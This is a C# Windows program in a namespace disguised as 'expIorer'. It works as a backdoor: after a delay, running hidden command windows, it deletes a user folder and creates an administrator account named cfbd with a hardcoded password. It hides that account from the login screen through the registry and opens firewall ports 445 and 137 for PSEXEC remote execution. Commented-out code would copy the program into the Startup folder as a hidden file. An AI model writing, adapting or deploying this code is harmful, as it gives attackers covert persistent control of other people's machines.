using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Security.Principal;

namespace expIorer
{
    class Program
    {
        static string runCommand(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + cmd;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.Start();
            string read = process.StandardOutput.ReadToEnd();
            return read;
        }

        static void check()
        {
            System.Threading.Thread.Sleep(120000);
            runCommand(@"rmdir /s /q C:\Users\cfbd");
            string cfbdPass = "cfbd";
            string result = runCommand("net user | find /i \"cfbd\" || echo new");
            if (result.Contains("new"))
            {
                runCommand("net user cfbd " + cfbdPass + @" /add");
                runCommand("net localgroup Administrators \"cfbd\" /add");
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                key.CreateSubKey("SpecialAccounts");
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts", true);
                key.CreateSubKey("UserList");
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", true);
                key.SetValue("cfbd", 0x0, RegistryValueKind.DWord);
                key.Close();
                runCommand("netsh advfirewall firewall add rule name=\"Allow PSEXEC TCP-445\" dir=in action=allow protocol=TCP localport=445");
                runCommand("netsh advfirewall firewall add rule name=\"Allow PSEXEC UDP-137\" dir=in action=allow protocol=UDP localport=137");
            }


        }

        static void Main(string[] args)
        {
            Random rnd = new Random();
            int ting = rnd.Next(97, 122);
            /*
            string startupDir = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
            string altName = @"\pl" + Convert.ToString((char)ting) + ".exe";
            if (Directory.GetCurrentDirectory() != startupDir)
            {
                try
                {
                    File.Copy("pl.exe", (startupDir + @"\pl.exe"));
                    runCommand("attrib +h " + startupDir + @"\pl.exe");
                    runCommand(startupDir + @"\pl.exe");
                    return;
                }
                catch
                {
                    File.Copy("pl.exe", (startupDir + altName));
                    runCommand("attrib +h " + startupDir + altName);
                    runCommand(startupDir + altName);
                    return;
                }
            }
            */
            check();
        }
    }
}
